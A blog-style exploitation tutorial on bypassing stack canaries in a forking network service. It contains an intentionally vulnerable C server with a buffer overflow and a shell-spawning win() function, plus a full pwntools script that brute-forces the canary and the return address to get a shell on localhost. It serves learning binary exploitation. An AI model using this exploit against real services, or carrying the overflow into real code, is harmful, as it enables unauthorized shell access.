---
title: Bypass Canary in a Network Forking Service
date: 2022-01-19 10:05:00 +0530
categories: [Pwn]
tags: [pwn,fork,bof]
pin: true
---
## How to Bypass Stack Canary in a Network Forking Service :satellite:

### What is a Stack Canary ? :bird:
* Stack Canary is a mitigation introduced to prevent :x:buffer overflows:x:. It is a random value placed on the stack which changes each time the program is executed.
* It is **usually** placed right before the base pointer and just before the function exits the value of the canary is checked. If the value of the canary is altered, the program exits else the function cleanly returns.

### Stucture of a Stack Canary 
* Stack Canary is made up of 8 bytes where in the 1st byte is a null byte and the rest of them are random bytes i.e anything from `0x0 to 0xff`
* The reason the first byte is a null byte is because some functions like puts() keep on outputting data on the stack until they hit a null byte so since the first byte is a null byte function like puts cant leak the canary accidently

### Target Program

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 4444

void win()
{
    system("/bin/sh");
}
void challenge()
{
    char buf[64];
    memset(buf, 0, sizeof(buf));
    puts("Please enter then length of your name: ");
    int length;
    scanf("%lu", &length);
    puts("Please enter your name: ");
    read(0, buf, length);
    return;
}

int main()
{

    int sockfd, ret;
    struct sockaddr_in serverAddr;

    int newSocket;
    struct sockaddr_in newAddr;

    socklen_t addr_size;
    char buffer[1024];
    pid_t childpid;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
    {
        printf("[-]Error in connection.\n");
        exit(1);
    }
    printf("[+]Server Socket is created.\n");

    memset(&serverAddr, '\0', sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);
    serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    ret = bind(sockfd, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
    if (ret < 0)
    {
        printf("[-]Error in binding.\n");
        exit(1);
    }
    printf("[+]Bind to port %d\n", 4444);

    if (listen(sockfd, 10) == 0)
    {
        printf("[+]Listening....\n");
    }
    else
    {
        printf("[-]Error in binding.\n");
    }

    while (1)
    {
        newSocket = accept(sockfd, (struct sockaddr *)&newAddr, &addr_size);
        if (newSocket < 0)
        {
            exit(1);
        }
        printf("Connection accepted from %s:%d\n", inet_ntoa(newAddr.sin_addr), ntohs(newAddr.sin_port));

        if ((childpid = fork()) == 0)
        {
            break;
        }
        wait(0);
    }
    dup2(newSocket, 0);
    dup2(newSocket, 1);
    dup2(newSocket, 2);
    challenge();
    return 0;
}
```

> complied with `gcc server.c -o server `. So, mitigations like PIE,ASLR are present and the stack is not executable which means ret2shellcode is not possible.

### Understanding the code

From the code we can see that the program is a network service which forks itself on each connection and then executes the challenge function. The challenge function itself has a buffer overflow vulnerability which we will abuse.

### Reversing the program

Open the program in your favourite disassembler and look at the challenge function.

![rev_IDA](https://res.cloudinary.com/dkojbf7tx/image/upload/v1634745542/BlogImages/j9xbzgk1wqoathv3pat9.png)

we see that we can read an arbitrary amount of bytes based upon our input into the buffer stored at `rbp - 0x50`. The stack canary is usually located at `rbp-0x8`. Therefore we would have to overwrite 72 bytes to reach the canary and further 8 bytes to overwrite it and then 8 bytes again to overwrite the base pointer and the 8 bytes again to overwrite the return address.

### Exploitation

The great thing about fork() is that the memory layout doesn't change which also means that in such a forking service the canary will always remains fixed once the program starts executing. So our first step would be to brute force the canary.

1. Fill the stack with garbage upto the stack canary
2. Overwrite the next byte with a non null byte and see that the program terminates with the message `***stack smashing detected***`
3. Instead of a non null byte input a null byte and see that the program doesnt crash anymore.
4. It does'nt crash because the first byte of the canary is always a null byte and since we overwrote it with a null byte the canary itself did'nt get changed and the program did not crash.
5. Similarly brute force the entrire canary by sending bytes with values ranging from `0x00 to 0xff` until the program does'nt crash.
6. The bytes which were responsible for not crashing the program together combined are the canary.

![canary.py](https://res.cloudinary.com/dkojbf7tx/image/upload/v1635943454/BlogImages/diozbtn6dk1hgyypxu6v.png)

Our next step will be to overwrite the return address to point to the win function

1. We first overwrite the base pointer with some garbage.
2. We know that the function will return back to main.
3. So the return address can be expressed as PIE base + some offset in the code section
4. Since our win function also lies in the code function we know its offset as well
5. Since memory pages are aligned to 0x1000 bytes we therfore know the last 3 nibbles of the win function correctly (you can get this offset from objdump or some decomplier as well)
6. However while sending input we cant sent nibble so we have to send 2 bytes and brute force the missing nibble
7. Bruteforcing will be easy as there are only 16 values that a nibble can take.
8. We check that if we have spawned a shell be simply sending a echo command and checking its output.

![brute_rip.py](https://res.cloudinary.com/dkojbf7tx/image/upload/v1635944076/BlogImages/nim0eg1ltjhckevx77wb.png)

### Full Exploit Code

```python
#!/usr/bin/python3
import pwn  # import pwntools
pwn.context.log_level = 'CRITICAL'
canary = b""


def leak_canary(canary):
    for i in range(8):  # loop 8 times for 8 bytes of a canary
        for j in range(256):  # loop 256 times for all possible values of a byte
            # create a connection to localhost:4444
            io = pwn.remote("127.0.0.1", 4444)
            # buf is at rbp-0x50 and canary is at rbp-0x8
            # so we write 72 bytes of garbage + 8 byte canary
            io.recv()
            payload1 = b"80"
            # send size
            io.sendline(payload1)
            io.recv()
            # send payload
            payload2 = b"A"*72
            payload2 += canary
            payload2 += pwn.p8(j)
            io.send(payload2)
            mssg = io.clean()
            # check if canary corrupted
            if b"stack" not in mssg:
                # Append byte found to canary
                canary += pwn.p8(j)
                print(f"[+] Canary - {hex(pwn.unpack(canary,'all'))}")
                io.close()
                break
            io.close()
    return canary


canary = pwn.u64(leak_canary(canary))
print("[!] Canary Leaked - ", hex(canary))
rbp = b"A"*8
canary = pwn.p64(canary)


def brute_win_func(rbp, canary):
    for i in range(16):
        print(f"Trying {i}")
        io = pwn.remote("127.0.0.1", 4444)
        io.recv()
        payload1 = b"90"
        # send size
        io.sendline(payload1)
        io.recv()
        # 00000000000013c9 <win>:
        ret_addr = pwn.p8(0xc9)  # the fixed byte
        # the byte whose nibble we have to bruteforce
        ret_addr += pwn.p8(i*16+0x3)
        payload2 = b"A"*72
        payload2 += canary
        payload2 += rbp
        payload2 += ret_addr
        io.send(payload2)
        # echo command to check if we have shell
        command = b"echo hello\n"
        io.sendline(command)
        mssg = io.clean()
        if b"hello" in mssg:
            # drop into interactive shell session
            io.interactive()
        io.close()


brute_win_func(rbp, canary)
```

### Exploit in Action -

![exploit_gif](https://res.cloudinary.com/dkojbf7tx/image/upload/v1635944989/BlogImages/exikme8h7gvfulxbd8sz.gif)

